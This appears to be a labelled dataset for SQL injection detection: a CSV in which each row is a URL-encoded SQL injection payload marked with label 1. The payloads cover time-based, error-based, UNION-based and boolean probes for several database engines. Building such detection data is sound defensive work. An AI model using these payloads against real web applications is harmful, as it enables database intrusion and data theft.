Query,Label
%2d%39%37%336' o%72 %6d%61%6b%65%5f%73%65%74  %28  %37%33%31%31  %3d  %32%30%367%2c2%3067  %29   a%6ed %27%63%7a%64%74%27 lik%65 %27%63%7a%64%74,1
%2d%32%32%39%31   %29    %29    %6fr %34067  %3d  %356%36%36%23,1
1%25%27 an%64   %28  %3302%30  %3d  %3302%30  %29  %2a%36%37%30%33 an%64 %27%%27  %3d  %27,1
"%31%25%27   %29    %29    p%72oc%65%64u%72%65 %61%6e%61l%79%73%65  %28  %65%78%74%72%61%63t%76%61%6c%75%65  %28  9255,c%6fncat  %28  %30%78%35c,  %28  be%6echmar%6b  %28  5%3000000,%6d%645  %28  0x%352515a50   %29    %29      %29    %29     %29  %2c%31  %29   an%64    %28    %28   %27%25%27  %3d  %27",1
%3%31   %29    %29    %6%31nd 2%385%33  %3d  c%6%31st   %28    %28   c%68r  %28  %3%31%3%313  %29  |%7cc%68r  %28  %3%31%3%313  %29  |%7cc%68r  %28  %3%31%3%312  %29  |%7cc%68r  %28  %3%3%31%3%30%36  %29  |%7cc%68r  %28  %3%31%3%313   %29    %29   |%7c  %28  s%65%6c%65%63%74   %28  %63%6%31se %77%68e%6e   %28  2%385%33  %3d  2%385%33  %29   %74hen %3%31 els%65 %30 %65nd   %29    %29   ::text|%7c  %28  c%68r  %28  %3%31%3%313  %29  |%7cc%68r  %28  %3%3%312%32  %29  |%7cc%68r  %28  %3%31%3%318  %29  |%7cc%68r  %28  %3%3%312%32  %29  |%7cc%68r  %28  %3%31%3%313   %29    %29    %61s n%75%6d%65ri%63  %29   %6%31nd    %28    %28   528%3%31  %3d  528%3%31,1
"1%22 %6fr e%78%74%72a%63%74va%6c%75%65  %28  %31%329%37%2c%63on%63%61%74  %28  0x5%63,0%787%317170%36a7%31%2c  %28  sel%65%63%74   %28  %65%6c%74  %28  %31%32%39%37  %3d  %31%32%39%37,1   %29    %29     %29  ,%30x717a7%367a71   %29    %29    a%6e%64 %22gkn%6e%22 %6cike %22%67%6b%6e%6e",1
%2d%34%30%331%25%22 u%6e%69o%6e %61%6cl %73e%6cec%74 %39566--,1
"1%25%27  %29   o%72 %352%38%36  %3d    %28  %73%65%6c%65%63%74 %63%6f%75%6e%74  %28  %2a  %29   f%72%6fm all_user%73 t1,all_user%73 t2,all_user%73 t3,all_user%73 t4,all_user%73 t%35  %29   a%6ed   %28  %27%25%27  %3d  %27",1
%65%6e%64 %61%6e%64    %28    %28   %27vk%6ce'  %3d  %27%76kle,1
1%%27   %29    %29     %29   %6f%72 %38%34%32%31  %3d    %28  %73%65%6c%65%63%74 %63o%75%6et  %28  %2a  %29   f%72%6f%6d %67%65%6e%65%72%61%74%65%5f%73%65%72%69%65%73  %28  %31%2c%35%30%30%30%30%30%30   %29    %29    a%6ed    %28    %28     %28  %27%25%27  %3d  %27,1
"  %28  s%6%35%6c%6%35%63%74 %2a %66%72o%6d   %28  s%6%35%6c%6%35%63%74  %28  %73le%6%35p  %28  %35   %29    %29     %29  %73%72%6d%71  %29   a%6e%64   %28  ""vjl%72"" %6c%69k%65 %22%76%6a%6c%72",1
%31 %6f%72d%65r %62y %3%31%2d%2d,1
s%65le%63%74   %28  %63%61se w%68%65%6e   %28  %38%382%30  %3d  4%3648  %29   t%68%65%6e %38%382%30 %65%6cse %38%382%30*  %28  s%65le%63%74 %38%382%30 %66%72o%6d i%6e%66%6f%72%6d%61%74%69%6f%6e_%73%63%68%65%6d%61%2e%63%68%61%72%61%63%74%65%72%5f%73%65%74%73  %29   %65n%64  %29  %23,1
%31 %6f%72 85%314  %3d  %62%65%6e%63hma%72k  %28  5%30000%300%2cmd5  %28  0x5%34%34d%35a4c   %29    %29   %23,1
"%31  %29   an%64 %6%35%6c%74  %28  %312%310  %3d  %312%310,sleep  %28  %35   %29    %29    an%64   %28  %319%31%35  %3d  %319%31%35",1
"%3%31'   %29    %29    %6%31%6e%64 %36%305%35  %3d  %63%74%78%73%79%73%2e%64%72%69%74%68%73%78%2e%73%6e  %28  %36%305%35,  %28  c%68%72  %28  %3%31%3%31%33  %29  %7c|c%68%72  %28  %3%31%3%31%33  %29  %7c|c%68%72  %28  %3%31%3%31%32  %29  %7c|c%68%72  %28  %31%3%30%36  %29  %7c|c%68%72  %28  %3%31%3%31%33  %29  %7c|  %28  %73%65l%65%63%74   %28  %63%6%31s%65 %77%68e%6e   %28  %36%305%35  %3d  %36%305%35  %29   the%6e %31 %65%6c%73%65 %30 %65%6e%64  %29   %66r%6fm %64%75%61%6c  %29  %7c|c%68%72  %28  %3%31%3%31%33  %29  %7c|c%68%72  %28  %31%32%32  %29  %7c|c%68%72  %28  %31%318  %29  %7c|c%68%72  %28  %31%32%32  %29  %7c|c%68%72  %28  %3%31%3%31%33   %29    %29     %29   %6%31%6e%64    %28    %28   %27%72%67%67%67%27  %3d  %27%72%67%67g",1
"%31""  %29   %61%73 %72%71%70%70 w%68%65re %393%383  %3d  %393%383 %6f%72 7%34%317  %3d    %28  s%65l%65c%74 %63%6funt  %28  %2a  %29   %66%72%6f%6d %73ysi%62m.%73%79%73tab%6ces %61%73 t1,%73ysi%62m.%73%79%73tab%6ces %61%73 t2,%73ysi%62m.%73%79%73tab%6ces %61%73 %74%33  %29  %2d%2d",1
%31%27   %29    %29    %61%73 %64ce%6e %77%68%6%35r%6%35 %35%38%3%35%32  %3d  %35%38%3%35%32 %6fr   %28  s%6%35le%63t %2a fr%6f%6d   %28  s%6%35le%63t  %28  %73l%6%35e%70  %28  %35   %29    %29     %29  yd%70u  %29  %2d-,1
"%2d%33%34%34%33""   %29    %29    uni%6fn al%6c s%65%6c%65%63%74 %34043,4043,4043,4043,40%343,4043,4043#",1
"1%27  %29   %6f%72 %6%35l%74  %28  %362%372  %3d  %362%372,sleep  %28  %35   %29    %29    %61%6e%64   %28  %27%78%77%73%62%27  %3d  %27x%77s%62",1
%31   %29    %29    a%73 x%6d%61c %77%68e%72%65 7%36%39%32  %3d  7%36%39%32,1
%2d%38%30%37%31   %29    %29    %6f%72 9%31%36%30  %3d  %34%32%35%33,1
"%31  %29   %61%6e%64 %35%35%35%36  %3d    %28  se%6ce%63%74 cou%6et  %28  %2a  %29   f%72o%6d %61%6c%6c%5f%75%73%65%72%73 t%31,%61%6c%6c%5f%75%73%65%72%73 t2,%61%6c%6c%5f%75%73%65%72%73 t3,%61%6c%6c%5f%75%73%65%72%73 t4,%61%6c%6c%5f%75%73%65%72%73 %74%35  %29   %61%6e%64   %28  5%30%39%38  %3d  5%30%39%38",1
"%31%27  %29   %61s %71%61%65%63 %77%68%65%72e %36%35%37%32  %3d  %36%35%37%32 o%72 5%33%356  %3d    %28  %73ele%63t co%75%6et  %28  %2a  %29   fro%6d %73%79%73%75%73%65%72s %61s sys1,%73%79%73%75%73%65%72s %61s sys2,%73%79%73%75%73%65%72s %61s sys3,%73%79%73%75%73%65%72s %61s sys4,%73%79%73%75%73%65%72s %61s sys5,%73%79%73%75%73%65%72s %61s sys6,%73%79%73%75%73%65%72s %61s s%79%73%37  %29  -%2d",1
%31  %29   a%73 vbl%69 w%68%65r%65 5%3139  %3d  5%3139 a%6ed %32%3782  %3d  %32%3625-%2d,1
"%31'  %29   %61s %77%70om %77h%6%35re %32%3620  %3d  %32%3620 %61n%64 %6%35lt  %28  311%34  %3d  311%34,sleep  %28  %35   %29    %29   %23",1
%3%31%27%2c  %28  s%65%6cec%74   %28  c%6%3%31%73e w%68%65%6e   %28  %33%3576  %3d  %37%374%34  %29   %74%68%65%6e %3%31 %65lse %63%6%31%73%74  %28  %3%31 %61%73 %69n%74  %29  %2f  %28  s%65%6cec%74 %30 fro%6d dua%6c  %29   %65n%64  %29   fro%6d dua%6c  %29  ,1
"-23%394'  %29   u%6e%69%6f%6e %61%6cl %73%65l%65%63t %31%3650,165%30,1650,1650,1650,%31650,1650--",1
%31%22   %29    %29    %61%73 %78xdm wh%65%72%65 %348%31%38  %3d  %348%31%38,1
%73%65%6ce%63%74   %28  %63a%73%65 wh%65%6e   %28  %33%33%36%35  %3d  %36%32%336  %29   the%6e %33%33%36%35 %65%6c%73e %31%2f  %28  %73%65%6ce%63%74 %30  %29   %65nd  %29  -%2d,1
  %28  se%6cect %2a fr%6f%6d   %28  se%6cect  %28  %73leep  %28  %35   %29    %29     %29  %73rmq  %29   a%6e%64 %22wsmz%22 %6c%69%6be %22ws%6dz,1
"1%22   %29    %29    %61%73 %6c%74%63%6f w%68e%72%65 %33%386%32  %3d  %33%386%32 %6f%72 %35%32%38%36  %3d    %28  %73%65%6c%65%63%74 co%75nt  %28  %2a  %29   %66r%6fm %61ll%5f%75%73%65%72%73 t1,%61ll%5f%75%73%65%72%73 t2,%61ll%5f%75%73%65%72%73 t3,%61ll%5f%75%73%65%72%73 t4,%61ll%5f%75%73%65%72%73 %745  %29  %2d%2d",1
"%31'  %29   %75ni%6fn al%6c s%65%6c%65c%74 null,null,null,null,n%75ll,nul%6c%23",1
s%65lect   %28  %63as%65 wh%65n   %28  %33%30%37%36  %3d  %33%35%396  %29   %74h%65%6e %33%30%37%36 %65l%73e %33%30%37%36*  %28  s%65lect %33%30%37%36 %66rom my%73ql.db  %29   %65n%64  %29  %23,1
%31'  %29   %61s %6ec%6f%7%35 %77%68%6%35%72%6%35 9%31%36%36  %3d  9%31%36%36 %61%6e%64   %28  %73%6%35%6ce%63%74 %2a %66%72%6fm   %28  %73%6%35%6ce%63%74  %28  %73%6c%6%35%6%35%70  %28  %35   %29    %29     %29  f%7a%6e%6f  %29  %2d%2d,1
"%2d%380%325""  %29   %6fr   %28  143%36  %3d  %34%31%38%36  %29  *%34%31%38%36 %61%6e%64   %28  %22%73qw%76"" %6ci%6be ""%73q%77v",1
"%2d2%3%3%31%3%31%3%3%3%30%27 %6fr %3%31 gr%6fup %62%79 %63%6fn%63%6%31t  %28  %3%3%30x7%3%317%3%317%3%3%306a7%3%31,  %28  sele%63t   %28  %63%6%31%73%65 %77%68%65%6e   %28  4%323%32  %3d  4%323%32  %29   %74he%6e %3%31 %65%6c%73%65 %3%3%30 %65nd   %29    %29   ,%3%3%30x7%3%317a767a7%3%31,flo%6fr  %28  %72%61%6e%64  %28  %3%3%30  %29  %2a2   %29    %29    %68av%69%6e%67 %6d%69n  %28  %3%3%30  %29  %23",1
%31%27 wh%65re 9%360%32  %3d  9%360%32,1
%31'+  %28  %73e%6c%65%63%74 i%75t%6b %77he%72e %36%31%35%38  %3d  %36%31%35%38,1
"-7%3%308%33"" %6f%72 5%3%3023  %3d  c%74xs%79%73.d%72i%74%68%73%78%2esn  %28  5%3%3023,  %28  %63%68%72  %28  %3%31%31%33  %29  |%7c%63%68%72  %28  %3%31%31%33  %29  |%7c%63%68%72  %28  %3%31%3%31%32  %29  |%7c%63%68%72  %28  %3%31%30%36  %29  |%7c%63%68%72  %28  %3%31%31%33  %29  |%7c  %28  se%6ce%63t   %28  cas%65 w%68%65n   %28  5%3%3023  %3d  5%3%3023  %29   %74%68%65%6e %31 %65l%73%65 %30 en%64  %29   %66%72o%6d %64ua%6c  %29  |%7c%63%68%72  %28  %3%31%31%33  %29  |%7c%63%68%72  %28  %3%3%3122  %29  |%7c%63%68%72  %28  %31%318  %29  |%7c%63%68%72  %28  %3%3%3122  %29  |%7c%63%68%72  %28  %3%31%31%33   %29    %29     %29   an%64 %22%61%6a%63%6c%22 li%6be %22%61jc%6c",1
"-1055%22 %6f%72   %28  %38%345%39  %3d  %38%345%39  %29  *%34%390%36 a%6e%64 ""k%64br""  %3d  ""%6bdb%72",1
"%31 %61%6e%64 8%3189  %3d    %28  %73el%65%63t co%75%6e%74  %28  %2a  %29   fr%6fm s%79%73%69b%6d%2e%73y%73%74%61ble%73 %61s t%31,s%79%73%69b%6d%2e%73y%73%74%61ble%73 %61s t2,s%79%73%69b%6d%2e%73y%73%74%61ble%73 %61s t%33  %29  %2d%2d",1
"%31%25""   %29    %29    u%6eion %61%6c%6c s%65%6c%65ct null,null,nu%6cl,null--",1
"1%22 %77%68%65re %35%3334  %3d  %35%3334 %6fr e%78p  %28  %7e  %28  %73%65%6c%65%63%74 %2a %66%72%6f%6d   %28  %73%65%6c%65%63%74 %63o%6eca%74  %28  %30%787%31%37%3170%36a%37%31,  %28  %73%65%6c%65%63%74   %28  %65%6c%74  %28  6%32%370  %3d  6%32%370,1   %29    %29     %29  %2c%30%78%37%31%37%61%376%37a%371,%30%78%37%38   %29    %29   %78   %29    %29   %2d-",1
"-4%308%35%27+  %28  %73e%6c%65%63%74 %61i%70%6e %77her%65 54%393  %3d  54%393 un%69%6f%6e %61l%6c %73e%6c%65%63%74 54%393,54%393,54%393,54%393,54%393,54%393,54%393#",1
%31 %6f%72   %28  %73%6%35%6c%6%35c%74 %2a %66%72%6f%6d   %28  %73%6%35%6c%6%35c%74  %28  %73%6c%6%35%6%35%70  %28  %35   %29    %29     %29  %73ddo  %29  %23,1
"%31%27  %29   %61%73 %72%71%7a%7a w%%368e%72%65 %34%39%38%37  %3d  %34%39%38%37 %6f%72 %63%%368ar  %28  %368  %29  ||%63%%368ar  %28  %369  %29  ||%63%%368ar  %28  %39%37  %29  ||%63%%368ar  %28  %38%35  %29    %3d  r%65gexp_%73ubstring  %28  r%65p%65a%74  %28  %72%69%67h%74  %28  %63%%368ar  %28  %35%338%39  %29  %2c%30  %29  ,%35%30000000%300  %29  %2c%6e%75%6c%6c  %29  %2d-",1
"%2d%39%35%33%32   %29    %29    %75%6e%69%6f%6e %61l%6c s%65%6cect %36%30%33%39%2c%36%303%39,6%30%33%39%2c%36%30%339-%2d",1
%31%27%2b  %28  %73e%6c%6%35%63%74 op%68z w%68%6%35re %39%31%3%35%38  %3d  %39%31%3%35%38 r%6ci%6b%6%35   %28  %73e%6c%6%35%63%74 %2a %66%72%6f%6d   %28  %73e%6c%6%35%63%74  %28  slee%70  %28  %35   %29    %29     %29  %73%67vo   %29    %29   +%27,1
"%31%22 %6%31%6e%64 %36%324%30  %3d    %28  'qq%7%30j%7%31'||  %28  %73%65le%63%74 c%6%31%73%65 %36%324%30 w%68en %36%324%30 %74%68%65%6e %31 %65lse %30 en%64 %66%72%6f%6d r%64b%24da%74a%62as%65  %29  %7c%7c%27%71%7a%76%7a%71%27  %29   %6%31%6e%64 ""%74j%62%65%22 %6c%69%6b%65 ""%74%6a%62e",1
"%2d%37%32%34%38%27  %29   wh%65re 4%36%32%36  %3d  4%36%32%36 %6fr %3%31 %67r%6fup %62y %63%6f%6e%63%6%31%74  %28  %3%3%30x7%3%317%3%317%3%3%306a7%3%31,  %28  %73e%6c%65ct   %28  %63%6%31%73%65 w%68%65n   %28  423%32  %3d  423%32  %29   %74%68%65%6e %3%31 %65ls%65 %3%3%30 %65%6e%64   %29    %29   ,%3%3%30x7%3%317a767a7%3%31,flo%6fr  %28  %72an%64  %28  %3%3%30  %29  %2a%32   %29    %29    %68%61%76ing %6d%69%6e  %28  %3%3%30  %29  %23",1
"%31%22   %29    %29     %29   %6fr %37%35%35%32  %3d    %28  %73%65%6c%65%63t %63%6f%75nt  %28  %2a  %29   %66%72o%6d %72%64%62%24%66%69%65%6c%64%73 %61s t%31%2c%72%64%62%24%74%79%70%65%73 %61s t%32,rdb%24c%6flla%74i%6fn%73 %61s t3%2crdb$functions %61s t%34  %29   %61%6e%64    %28    %28     %28  %22%61%64%77%67%22 li%6b%65 %22a%64%77%67",1
"-%39%355%33""  %29   %61%73 gei%68 %77h%65re 6%34%353  %3d  6%34%353 %6f%72 %38%3453  %3d  8%31%35%39%2d%2d",1
%31  %29   o%72 %32%363%33  %3d  %64%62%6d%73%5f%70%69%70%%36%35%2e%72%%36%35ce%69%76%%36%35%5f%6d%%36%35%73%73a%67%%36%35  %28  %63%68%72  %28  %31%312  %29  ||%63%68%72  %28  %36%35  %29  ||%63%68%72  %28  %36%35  %29  ||%63%68%72  %28  %3%31%303  %29  %2c5  %29  ,1
"%31'   %29    %29     %29   %61%6e%64 %33%37%30%37  %3d    %28  %73%65%6c%65%63%74 c%6f%75%6e%74  %28  %2a  %29   %66%72%6fm sysibm.systa%62les a%73 t1,sysibm.systa%62les a%73 t2,sysibm.systa%62les a%73 t%33  %29   %61%6e%64    %28    %28     %28  %27%6fw%6ft'  %3d  %27%6fwot",1
"%2d237%38"" %77h%65%72%65 26%386  %3d  26%386 %6fr %36%38%37%32  %3d  %36%38%37%32--",1
%31'+  %28  %73%65l%65%63%74 %71%74y%69 wh%65re 7%31%347  %3d  7%31%347,1
"-%35%3313'  %29   %75%6e%69%6f%6e %61%6c%6c %73%65l%65%63t 7%3187,7187%2c%37187#",1
"-%378%35%38'  %29   %75%6e%69o%6e %61%6c%6c %73e%6c%65%63t 154%31,%31%3541,%315%34%31,%31%35%341%2c%3154%31,154%31%23",1
%31%27%7c%7c  %28  %73%65l%65%63%74 '%6al%6f%6e' w%68%65%72e %3%31461  %3d  %3%31461,1
%73%65%6c%65%63%74   %28  %63%61%73%65 w%68e%6e   %28  %32%3716  %3d  %38%31%33%38  %29   %74%68%65%6e %32%3716 %65%6c%73%65 %32%3716*  %28  %73%65%6c%65%63%74 %32%3716 %66%72%6f%6d %6dysq%6c%2e%64%62  %29   en%64  %29  %23,1
"%73%65%6c%65%63%74 %63ou%6e%74  %28  %2a  %29   %66%72%6f%6d %67%65%6e%65%72%61t%65_s%65%72%69%65%73  %28  1,50000%300  %29  %2d%2d",1
"%31%22  %29   %77%68e%72%65 %36%347%38  %3d  %36%347%38 unio%6e %61%6c%6c %73%65%6cect n%75%6c%6c%2c%6e%75%6c%6c%2c%6e%75%6c%6c%2c%6e%75%6c%6c%2c%6e%75%6c%6c,%6e%75%6c%6c%23",1
%2d5%377%31%27   %29    %29    u%6e%69%6f%6e al%6c %73el%65%63%74 %32%38%33%33%2c%32%38%33%33%2c%32%38%333%2c%32%383%33%2c%32%38%33%33%2c28%33%33%2d-,1
"%31""  %29   %61s k%62%6a%74 whe%72e %32%30%31%32  %3d  %32%30%31%32 a%6ed   %28  59%378  %3d  %36%38%39%38  %29  *%36%38%39%38--",1
en%64 %69%66,1
"-23%397   %29    %29    %61s oiz%79 wher%65 %3174%36  %3d  %3174%36 un%69%6f%6e a%6cl s%65lect %3174%36,%3174%36,%3174%36,%3174%36,%3174%36,%3174%36#",1
%31  %29   %6f%72   %28  %73e%6c%6%35%63%74 %2a %66%72om   %28  %73e%6c%6%35%63%74  %28  %73%6c%6%35%6%35p  %28  %35   %29    %29     %29  y%64%70%75  %29   an%64   %28  %37%30%379  %3d  %37%30%379,1
"%31%27   %29    %29    %7%30ro%63%65%64%75r%65 an%6%31ly%73%65  %28  %65%78%74%72%6%31%63%74v%6%31%6c%75%65  %28  5%38%34%30%2cconcat  %28  %30x5c,%30x7%317%31%37%30%36a7%31,  %28  %73%65%6c%65%63%74   %28  c%6%31%73e %77%68e%6e   %28  5%38%34%30  %3d  5%38%34%30  %29   %74hen %31 els%65 %30 %65%6e%64   %29    %29   ,%30x7%317a767a7%31   %29    %29   ,%31  %29   a%6ed    %28    %28   %27%61%73%64c%27 l%69%6be %27as%64c",1
%3%31%27   %29    %29    a%6ed 4%338%36  %3d  %75%74l%5f%69%6e%6%31%64d%72.g%65t_%68ost_%6%31d%64re%73s  %28  %63hr  %28  %3%31%31%33  %29  %7c|%63hr  %28  %3%31%31%33  %29  %7c|%63hr  %28  %31%3%312  %29  %7c|%63hr  %28  %3%31%3%30%36  %29  %7c|%63hr  %28  %3%31%31%33  %29  %7c|  %28  s%65%6c%65%63%74   %28  %63%6%31se %77%68%65%6e   %28  4%338%36  %3d  4%338%36  %29   the%6e %31 %65%6c%73%65 %30 e%6ed  %29   f%72%6fm d%75al  %29  %7c|%63hr  %28  %3%31%31%33  %29  %7c|%63hr  %28  %3%31%32%32  %29  %7c|%63hr  %28  %31%318  %29  %7c|%63hr  %28  %3%31%32%32  %29  %7c|%63hr  %28  %3%31%31%33   %29    %29    a%6ed    %28    %28   '%66%6f%6f%70' %6cike %27f%6f%6f%70,1
"%73%65%6c%65%63%74 l%69%6b%65  %28  %27%61%62cde%66%67%27,upp%65%72  %28  %68%65%78  %28  ra%6edomblob  %28  50%3000%30000%2f2   %29    %29      %29    %29    %61%6e%64    %28    %28     %28  6%305%31  %3d  6%305%31",1
"%31'%2b  %28  %73elect %73%66%75%71 w%68%65re %380%39%34  %3d  %380%39%34 %70%72%6f%63%65%64%75r%65 %61%6e%61%6cy%73%65  %28  %65xtra%63%74%76%61%6c%75e  %28  %39%32%35%35%2c%63%6f%6e%63%61%74  %28  %30x5%63%2c  %28  be%6ec%68%6da%72%6b  %28  %35%30%30%30%30%30%30%2cm%64%35  %28  %30%78%3525%31%35%61%35%30   %29    %29      %29    %29     %29  ,%31   %29    %29   +%27",1
"-9%3046'   %29    %29    %61%73 y%6dq%63 w%68%65%72%65 %33%37%33%33  %3d  %33%37%33%33 %75%6e%69%6f%6e %61l%6c %73%65%6c%65c%74 %33%37%33%33,%33%37%33%33,%33%37%33%33,%33%37%33%33,%33%37%33%33,%33%37%33%33,%33%37%33%33--",1
 %28  %63%61%73e %77hen %32%36%34%36  %3d  %38%35%32%30 %74%68%65%6e %32%36%34%36 %65%6cse n%75ll %65%6e%64  %29 ,1
"%73%65%6c%65%63%74 c%6fu%6e%74  %28  %2a  %29   f%72%6fm %72%64%62$f%69%65%6c%64s %61%73 t1,rdb$t%79p%65s %61%73 %74%32,rd%62%24c%6fl%6c%61%74ion%73 %61%73 t%33,%72db%24%66un%63ti%6fns %61%73 t%34-%2d s%61%70%69",1
%3%31'   %29    %29     %29   %6%31%6e%64 %33%375%34  %3d    %28  s%65le%63t %75%7%30%7%30%65%72  %28  %78%6d%6c%74%79%7%30%65  %28  %63%68%72  %28  %36%3%30  %29  %7c|%63%68%72  %28  5%38  %29  %7c|%63%68%72  %28  %31%3%31%33  %29  %7c|%63%68%72  %28  %31%3%31%33  %29  %7c|%63%68%72  %28  %3%31%3%312  %29  %7c|%63%68%72  %28  %31%30%36  %29  %7c|%63%68%72  %28  %31%3%31%33  %29  %7c|  %28  s%65le%63t   %28  %63a%73e %77h%65%6e   %28  %33%375%34  %3d  %33%375%34  %29   t%68e%6e %31 e%6cse %30 %65%6e%64  %29   %66%72%6f%6d %64ua%6c  %29  %7c|%63%68%72  %28  %31%3%31%33  %29  %7c|%63%68%72  %28  %31%322  %29  %7c|%63%68%72  %28  %31%318  %29  %7c|%63%68%72  %28  %31%322  %29  %7c|%63%68%72  %28  %31%3%31%33  %29  %7c|%63%68%72  %28  6%32   %29    %29     %29   %66%72%6f%6d %64ua%6c  %29   %6%31%6e%64    %28    %28     %28  %27%6d%66%6d%6b%27  %3d  'mfm%6b,1
-126%39' %6f%72 %3%31%35%370  %3d  %63o%6e%76er%74  %28  i%6et%2c  %28  %73%65l%65%63%74 %63%68%61r  %28  %31%31%33  %29  %2b%63%68%61r  %28  %31%31%33  %29  %2b%63%68%61r  %28  %31%31%32  %29  %2b%63%68%61r  %28  %31%30%36  %29  %2b%63%68%61r  %28  %31%31%33  %29  %2b  %28  %73%65l%65%63%74   %28  c%61se %77%68%65n   %28  %3%31%35%370  %3d  %3%31%35%370  %29   the%6e %63%68%61r  %28  %34%39  %29   el%73e %63%68%61r  %28  %34%38  %29   %65n%64   %29    %29   %2b%63%68%61r  %28  %31%31%33  %29  %2b%63%68%61r  %28  1%32%32  %29  %2b%63%68%61r  %28  %31%31%38  %29  %2b%63%68%61r  %28  1%32%32  %29  %2b%63%68%61r  %28  %31%31%33   %29    %29     %29   %61%6e%64 'g%6fhv' %6c%69%6b%65 %27g%6f%68v,1
"%2d%384%31%3%30%22 %6f%72 %35%3%30%323  %3d  ctxsys.d%72ithsx.sn  %28  %35%3%30%323,  %28  c%68r  %28  %31%31%33  %29  %7c%7cc%68r  %28  %31%31%33  %29  %7c%7cc%68r  %28  %31%31%32  %29  %7c%7cc%68r  %28  %31%30%36  %29  %7c%7cc%68r  %28  %31%31%33  %29  %7c%7c  %28  %73%65lect   %28  %63%6%31%73%65 %77%68%65n   %28  %35%3%30%323  %3d  %35%3%30%323  %29   t%68%65n %31 %65l%73%65 %30 e%6e%64  %29   %66r%6f%6d %64%75%61%6c  %29  %7c%7cc%68r  %28  %31%31%33  %29  %7c%7cc%68r  %28  %3%31%32%32  %29  %7c%7cc%68r  %28  %31%318  %29  %7c%7cc%68r  %28  %3%31%32%32  %29  %7c%7cc%68r  %28  %31%31%33   %29    %29     %29   %61%6e%64 ""x%68zr%22  %3d  %22%78h%7a%72",1
"%31%22 %6f%72 %35286  %3d    %28  %73el%65%63%74 %63%6f%75%6e%74  %28  %2a  %29   f%72om %61l%6c%5fus%65%72s t1,%61l%6c%5fus%65%72s t2,%61l%6c%5fus%65%72s t3,%61l%6c%5fus%65%72s t4,%61l%6c%5fus%65%72s %74%35  %29  ",1
"%73%65l%65c%74 %63%6f%75n%74  %28  %2a  %29   fro%6d %73%79%73%69%62%6d.%73%79%73%74%61%62%6c%65s %61%73 t1,%73%79%73%69%62%6d.%73%79%73%74%61%62%6c%65s %61%73 t2,%73%79%73%69%62%6d.%73%79%73%74%61%62%6c%65s %61%73 %74%33 a%6ed    %28    %28   %22%25%22  %3d  %22",1
%73e%6c%65c%74 %64%62%6d%73%5f%70%69%70%65%2e%72%65%63%65%69%76%65%5f%6d%65%73sa%%36%37%65  %28  %63%68r  %28  %366  %29  ||%63%68r  %28  %36%37  %29  ||%63%68r  %28  %379  %29  ||%63%68r  %28  %31%30%31  %29  %2c%35  %29   %66%72%6f%6d %64%75%61%6c %61%6e%64    %28    %28     %28  %22%25%22  %3d  %22,1
s%65l%65%63t cas%65 whe%6e %316%31%33  %3d  %32%39%337 %74%68%65%6e %31 el%73e %6e%75%6c%6c %65%6ed--,1
"%2d3%33%36%34%25""   %29    %29     %29   u%6ei%6f%6e %61%6c%6c s%65l%65%63%74 %354%36%34%2d%2d",1
"%31%27  %29   %61nd %38%31%38%39  %3d    %28  sele%63t %63oun%74  %28  %2a  %29   f%72%6f%6d %73%79%73%69%62m%2e%73y%73%74%61%62l%65%73 a%73 t1,%73%79%73%69%62m%2e%73y%73%74%61%62l%65%73 a%73 t2,%73%79%73%69%62m%2e%73y%73%74%61%62l%65%73 a%73 %74%33  %29  %2d-",1
"-99%329%27  %29   a%73 %67%62%74c w%68%65%72e %38%3%3%31%36%32  %3d  %38%3%3%31%36%32 o%72 %3%31 grou%7%3%3%30 %62%79 con%63at  %28  %3%3%30x7%3%317%3%317%3%3%306a7%3%31,  %28  %73%65l%65%63%74   %28  ca%73e %77hen   %28  4%32%33%32  %3d  4%32%33%32  %29   %74%68%65%6e %3%31 e%6cs%65 %3%3%30 %65nd   %29    %29   ,%3%3%30x7%3%317a767a7%3%31,floo%72  %28  ran%64  %28  %3%3%30  %29  *%32   %29    %29    havin%67 %6d%69%6e  %28  %3%3%30  %29  %23",1
"sel%65ct dbms_pip%65.r%65ceive_%6dessag%65  %28  %63%68%72  %28  6%36  %29  ||%63%68%72  %28  6%37  %29  ||%63%68%72  %28  7%39  %29  ||%63%68%72  %28  %310%31  %29  ,%35  %29   %66%72%6f%6d %64%75%61%6c %61nd %27%25%27  %3d  %27",1
"%31'+  %28  %73%6%35%6c%6%35%63t r%64%70e w%68%6%35%72%6%35 %36%35%3%353  %3d  %36%35%3%353 %6f%72 e%6ct  %28  %36%32%37%32  %3d  %36%32%37%32,sleep  %28  %35   %29    %29     %29  +%27",1
sele%63t l%69%6b%65  %28  %27%61b%63%64%65%66%67%27%2c%75%70%70%65%72  %28  %68%65%78  %28  r%61n%64o%6d%62lob  %28  50%300%3000%30%30/2   %29    %29      %29    %29    a%6ed    %28    %28     %28  %27%61tvu'  %3d  %27a%74v%75,1
